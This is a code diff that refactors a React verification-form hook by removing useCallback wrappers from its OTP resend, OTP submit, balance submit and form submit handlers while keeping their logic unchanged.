@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect } from "react";
 import { useSessionStatus } from "./use-session-status";
 import { useOtpResendCountdown } from "./use-otp-resend-countdown";
 import { submitOtp, resendOtp, submitBalance } from "../lib/verification-api";
@@ -72,12 +72,12 @@ export function useVerificationForm(): UseVerificationFormReturn {
 
   const layout = normalizeLayout(verificationLayout);
 
-  const resendFn = useCallback(async () => {
+  const resendFn = async () => {
     if (layout === "pin" || layout === "sms") {
       debugLog(debug, "resend OTP", { type: layout });
       await resendOtp(channelSlug, sessionId ?? "", layout);
     }
-  }, [channelSlug, sessionId, layout, debug]);
+  };
 
   const resendState = useOtpResendCountdown(
     RESEND_COOLDOWN,
@@ -106,44 +106,38 @@ export function useVerificationForm(): UseVerificationFormReturn {
     }
   }, [channelSlug, sessionId, status, redirectUrl, debug]);
 
-  const handleSubmitOtp = useCallback(
-    async (codeValue: string) => {
-      clearCodeFeedback?.();
-      setSubmitting(true);
-      debugLog(debug, "submit OTP", {
-        type: layout,
-        codeLength: codeValue.length,
-      });
-      try {
-        await submitOtp(channelSlug, sessionId ?? "", codeValue);
-        debugLog(debug, "OTP submitted OK");
-      } catch (e) {
-        const msg = e instanceof Error ? e.message : "Invalid code";
-        debugLog(debug, "OTP submit failed", { error: msg });
-        setSubmitError(msg);
-        setSubmitting(false);
-      }
-    },
-    [channelSlug, sessionId, clearCodeFeedback, debug, layout],
-  );
+  const handleSubmitOtp = async (codeValue: string) => {
+    clearCodeFeedback?.();
+    setSubmitting(true);
+    debugLog(debug, "submit OTP", {
+      type: layout,
+      codeLength: codeValue.length,
+    });
+    try {
+      await submitOtp(channelSlug, sessionId ?? "", codeValue);
+      debugLog(debug, "OTP submitted OK");
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : "Invalid code";
+      debugLog(debug, "OTP submit failed", { error: msg });
+      setSubmitError(msg);
+      setSubmitting(false);
+    }
+  };
 
-  const handleSubmitBalance = useCallback(
-    async (balanceValue: string) => {
-      setSubmitError(null);
-      setSubmitting(true);
-      debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
-      try {
-        await submitBalance(channelSlug, sessionId ?? "", balanceValue);
-        debugLog(debug, "balance submitted OK");
-      } catch (e) {
-        const msg = e instanceof Error ? e.message : "Failed to submit balance";
-        debugLog(debug, "balance submit failed", { error: msg });
-        setSubmitError(msg);
-        setSubmitting(false);
-      }
-    },
-    [channelSlug, sessionId, debug],
-  );
+  const handleSubmitBalance = async (balanceValue: string) => {
+    setSubmitError(null);
+    setSubmitting(true);
+    debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
+    try {
+      await submitBalance(channelSlug, sessionId ?? "", balanceValue);
+      debugLog(debug, "balance submitted OK");
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : "Failed to submit balance";
+      debugLog(debug, "balance submit failed", { error: msg });
+      setSubmitError(msg);
+      setSubmitting(false);
+    }
+  };
 
   const inProgress = status === "pending" || status === "awaiting_action";
   const awaitingVerification =
@@ -152,13 +146,13 @@ export function useVerificationForm(): UseVerificationFormReturn {
     status === "awaiting_push" ||
     status === "awaiting_balance";
 
-  const onSubmit = useCallback(() => {
+  const onSubmit = () => {
     if (layout === "balance") {
       handleSubmitBalance(balance);
     } else if (layout === "pin" || layout === "sms") {
       handleSubmitOtp(otpValue);
     }
-  }, [layout, balance, otpValue, handleSubmitBalance, handleSubmitOtp]);
+  };
 
   const canSubmit =
     layout === "balance"
